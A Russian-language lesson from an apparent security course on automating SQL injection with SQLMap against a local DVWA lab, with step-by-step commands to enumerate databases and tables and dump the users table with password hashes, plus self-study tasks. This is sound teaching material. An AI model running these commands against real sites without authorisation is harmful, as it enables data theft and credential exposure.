# Занятие 19. SQL Injection продвинутый: SQLMap автоматизация

## Теория

**SQLMap** — это открытый инструмент командной строки для автоматизированного обнаружения и эксплуатации уязвимостей SQL Injection. Написан на Python.

### Как работает SQLMap

1. **Обнаружение (Detection)**: Инструмент отправляет различные payloads и анализирует ответы сервера
2. **Определение БД (Fingerprinting)**: Определяет тип СУБД (MySQL, PostgreSQL, MSSQL, Oracle и др.)
3. **Эксплуатация (Exploitation)**: Извлекает данные через инъекцию

### Основные этапы атаки

1. Проверка на наличие уязвимости
2. Перечисление баз данных (`--dbs`)
3. Перечисление таблиц в базе (`--tables`)
4. Перечисление колонок (`--columns`)
5. Извлечение данных (`--dump`)

### Типы инъекций, которые ищет SQLMap

- Boolean-based blind
- Error-based
- Time-based blind
- UNION query
- Stacked queries

### Важные параметры

| Параметр | Описание |
|----------|----------|
| `-u URL` | Целевой URL |
| `--dbs` | Перечислить все базы данных |
| `--tables` | Перечислить таблицы (нужно указать `-D база`) |
| `--columns` | Перечислить колонки (нужно `-D база -T таблица`) |
| `--dump` | Скачать данные из таблицы |
| `--cookie` | Установить cookie (для авторизованных зон) |
| `--forms` | Тестировать формы на странице |
| `--batch` | Не задавать вопросов, использовать дефолтные ответы |
| `-p` | Указать параметр для тестирования |
| `--level` | Уровень тестирования (1-5, по умолчанию 1) |
| `--risk` | Риск тестирования (1-3, по умолчанию 1) |

---

## Практическое занятие

### Подготовка

Убедитесь, что DVWA запущена и вы авторизованы. Вам понадобятся cookie сессии.

**Получение cookie:**
1. Откройте DVWA в браузере
2. Войдите под admin/password
3. Откройте DevTools (F12) → вкладка Network
4. Обновите страницу, найдите запрос, скопируйте заголовок `Cookie`
5. Cookie выглядит примерно так: `PHPSESSID=abc123; security=low`

### Базовое использование SQLMap

**Шаг 1: Проверка на уязвимость**
```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
  --batch
```

Результат: SQLMap сообщит, уязвим ли параметр `id`.

**Шаг 2: Получение списка баз данных**
```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
  --dbs --batch
```

Результат: список баз (information_schema, dvwa, mysql, performance_schema).

**Шаг 3: Получение таблиц в базе dvwa**
```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
  -D dvwa --tables --batch
```

Результат: таблицы `guestbook` и `users`.

**Шаг 4: Получение колонок таблицы users**
```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
  -D dvwa -T users --columns --batch
```

Результат: список колонок (user_id, first_name, last_name, user, password...).

**Шаг 5: Скачивание данных из таблицы users**
```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
  -D dvwa -T users --dump --batch
```

Результат: полная таблица пользователей с хешами паролей.

### Использование прокси (для отладки)

Добавьте параметр `--proxy="http://127.0.0.1:8080"`, чтобы видеть запросы SQLMap в Burp Suite.

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
  --dbs --batch --proxy="http://127.0.0.1:8080"
```

### Скриншоты для отчета

1. **Скриншот 1**: Вывод команды `--dbs` — список баз данных
2. **Скриншот 2**: Вывод команды `-D dvwa --tables` — таблицы в dvwa
3. **Скриншот 3**: Вывод команды `--dump` — данные пользователей

---

## Задачи для самостоятельного выполнения

1. **Автоматизированный взлом**: Используя SQLMap, получите все данные из таблицы `users` в базе `dvwa`. В отчете укажите: какие команды вы использовали, сколько записей извлечено, какие хеши паролей получены.

2. **Работа с POST-запросами**: На странице SQL Injection (Blind) в DVWA используется POST-форма. Используйте SQLMap для взлома:
   ```bash
   sqlmap -u "http://localhost/vulnerabilities/sqli_blind/" \
     --data "id=1&Submit=Submit" \
     --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
     --dbs --batch
   ```
   Опишите разницу между тестированием GET и POST параметров.

3. **Извлечение конкретных колонок**: Используя SQLMap, получите только колонки `user` и `password` из таблицы `users`. Какую команду вы использовали? Сколько строк было извлечено?

4. **Тестирование уровня Medium**: Переключите DVWA на уровень Medium. Попробуйте использовать SQLMap с параметром `--level 2` или `--risk 2`. Сработало ли автоматическое обнаружение? Почему?

5. **Поиск других уязвимостей**: Используйте SQLMap с флагом `--forms` на главной странице DVWA (после входа), чтобы найти другие формы, потенциально уязвимые к SQLi. Перечислите найденные формы и результаты проверки.
